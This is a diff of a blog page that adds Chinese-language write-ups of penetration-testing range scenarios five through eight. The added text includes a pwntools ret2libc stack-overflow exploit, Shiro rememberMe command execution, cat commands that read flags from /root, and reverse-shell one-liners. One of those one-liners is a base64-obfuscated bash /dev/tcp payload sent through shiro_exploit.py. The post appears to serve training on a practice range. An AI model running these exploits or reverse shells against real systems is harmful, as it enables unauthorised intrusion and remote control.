@@ -340,8 +340,47 @@
 <p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/12.png" alt="12"></p>
 <h1 id="场景五"><a href="#场景五" class="headerlink" title="场景五"></a>场景五</h1><p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/13.png" alt="13"></p>
 <p>上一题提示 nc 和 root</p>
-<p>先 nc 扫描一下开放的端口</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -zv 106.14.115.235 1-60000</span><br></pre></td></tr></table></figure>
+<p>本来先 nc 扫描一下开放的端口，但是神奇的是我 nc 不仅扫不出来，而且扫完后我还无法访问靶场了……</p>
+<p>看了眼 wp，他是 nmap 扫的，得到了端口 <code>9999</code></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/14.png" alt="14"></p>
+<p>我重新开了一次环境（心疼），换了蚁剑连接，在 home 目录下找到了他说的 main 文件</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/15.png" alt="15"></p>
+<p>将文件下载下来，file 查看 32 位 pwn，ida 查看</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/16.png" alt="16"></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/17.png" alt="17"></p>
+<p>read 这里存在栈溢出，题目没给 system 和后门地址，需要我们 <code>ret2libc</code></p>
+<p>这里用 <code>ROPgadger</code>看一下 pop esi;edi;ebp;ret</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary=main | grep <span class="string">'pop'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/18.png" alt="18"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">'debug'</span>    </span><br><span class="line">r = remote(<span class="string">'47.103.74.70'</span>,<span class="number">9999</span>)    </span><br><span class="line">elf = ELF(<span class="string">'./main'</span>)    </span><br><span class="line">main_addr = elf.sym[<span class="string">'main'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]    </span><br><span class="line">print(write_got)    </span><br><span class="line">ppp_ret = <span class="number">0x08048559</span>    </span><br><span class="line">payload = <span class="string">b'A'</span>*(<span class="number">0x24</span> + <span class="number">4</span>) + p32(write_plt) + p32(ppp_ret) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">8</span>) + p32(main_addr)    </span><br><span class="line">r.sendlineafter(<span class="string">'plz input your name:\n'</span>,payload)    </span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))  </span><br><span class="line">print(hex(write_addr))  </span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>) </span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)  </span><br><span class="line">print(hex(system_addr),hex(binsh_addr))    </span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">40</span> +p32(system_addr) + <span class="string">b'a'</span>*<span class="number">4</span> + p32(binsh_addr)    </span><br><span class="line">r.sendlineafter(<span class="string">'plz input your name:\n'</span>,payload)   </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行后选择第 3 个</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/19.png" alt="19"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/20.png" alt="20"></p>
+<h1 id="场景六"><a href="#场景六" class="headerlink" title="场景六"></a>场景六</h1><p>上一题给出提示 8080 端口，因此我们待会对 8080 端口进行渗透</p>
+<p>对 8080 端口进行目录扫描，有一个 <code>robots.txt</code>，访问得到 flag</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/21.png" alt="21"></p>
+<h1 id="场景七"><a href="#场景七" class="headerlink" title="场景七"></a>场景七</h1><p>其实上一题还得到了一个 <code>login</code> 路径，访问是一个登录界面</p>
+<p>结合上一题提示，大概是找 RCE 了</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/22.png" alt="22"></p>
+<p>界面处有一个 <code>remember me</code> 可以去试试 <code>shiro</code> 的漏洞了</p>
+<p>先拦包看看回显发现有 <code>delete me</code></p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/23.png" alt="23"></p>
+<p>存在漏洞，这里我们直接用工具</p>
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/24.png" alt="24"></p>
+<p>命令执行处 ,根据上一题提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /home</span><br><span class="line">cat /home/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951/25.png" alt="25"></p>
+<h1 id="场景八"><a href="#场景八" class="headerlink" title="场景八"></a>场景八</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#使用工具执行命令</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.12.6&quot;,2518));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line">#nc接收</span><br><span class="line">nc -lvp 4568</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro_exploit.py -t 3 -u http:&#x2F;&#x2F;47.103.41.9:8080&#x2F; -p &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMTI4LzI1MTggMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>
 
 
       
@@ -453,7 +492,7 @@
                 
                   <a href="/">
                 
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">13</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -475,7 +514,7 @@
                 
                 <div class="site-state-item site-state-tags">
                   <a href="/tags/index.html">
-                    <span class="site-state-item-count">15</span>
+                    <span class="site-state-item-count">14</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
@@ -508,7 +547,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#场景一"><span class="nav-number">1.</span> <span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景二"><span class="nav-number">2.</span> <span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景三"><span class="nav-number">3.</span> <span class="nav-text">场景三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景四"><span class="nav-number">4.</span> <span class="nav-text">场景四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景五"><span class="nav-number">5.</span> <span class="nav-text">场景五</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#场景一"><span class="nav-number">1.</span> <span class="nav-text">场景一</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景二"><span class="nav-number">2.</span> <span class="nav-text">场景二</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景三"><span class="nav-number">3.</span> <span class="nav-text">场景三</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景四"><span class="nav-number">4.</span> <span class="nav-text">场景四</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景五"><span class="nav-number">5.</span> <span class="nav-text">场景五</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景六"><span class="nav-number">6.</span> <span class="nav-text">场景六</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景七"><span class="nav-number">7.</span> <span class="nav-text">场景七</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#场景八"><span class="nav-number">8.</span> <span class="nav-text">场景八</span></a></li></ol></div>
             
 
           </div>
